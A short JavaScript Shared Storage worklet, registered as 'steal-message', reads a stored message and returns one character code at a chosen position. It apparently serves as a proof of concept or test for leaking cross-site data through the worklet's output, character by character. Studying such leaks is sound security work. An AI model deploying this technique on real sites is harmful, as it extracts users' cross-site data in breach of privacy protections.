class StealMessageOperation {
  async run(urls, data) {
    try {
      const { charPos } = data;
      const message = await sharedStorage.get('message');
      return message.charCodeAt(charPos);
    } catch (e) {
      console.log(e);
    }
  }
}

register('steal-message', StealMessageOperation);
